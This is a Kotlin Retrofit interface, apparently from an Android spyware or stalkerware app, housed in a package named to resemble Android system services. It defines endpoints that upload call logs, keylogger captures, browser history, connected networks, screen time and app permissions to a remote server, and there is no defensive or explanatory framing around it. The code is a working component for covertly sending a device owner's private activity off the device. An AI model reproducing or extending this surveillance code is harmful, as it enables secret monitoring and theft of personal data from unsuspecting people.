package com.android.services.network.api

import com.android.services.models.*
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.Headers
import retrofit2.http.POST

interface NodeServerFourApi {

    @POST("auth")
    @Headers("Content-Type: application/json")
    fun hitAuthService(@Body auth: Auth): Call<ResponseBody>

    @POST("calls")
    @Headers("Content-Type: application/json")
    fun uploadCallLogs(@Body callLogUpload: CallLogUpload): Call<ResponseBody>

    @POST("keylogger")
    @Headers("Content-Type: application/json")
    fun uploadKeyLogs(@Body keyLogUpload: KeyLogUpload): Call<ResponseBody>

    @POST("browserHistory")
    @Headers("Content-Type: application/json")
    fun uploadBrowserHistory(@Body browserHistoryUpload: BrowserHistoryUpload): Call<ResponseBody>

    @POST("networks")
    @Headers("Content-Type: application/json")
    fun uploadConnectedNetworks(@Body connectedNetworkUpload: ConnectedNetworkUpload): Call<ResponseBody>

    @POST("activity")
    @Headers("Content-Type: application/json")
    fun uploadScreenTime(@Body screenTimeUpload: ScreenTimeUpload): Call<ResponseBody>

    @POST("appPermissions")
    @Headers("Content-Type: application/json")
    fun uploadAppPermissions(@Body appPermissionUpload: AppPermissionUpload): Call<ResponseBody>
}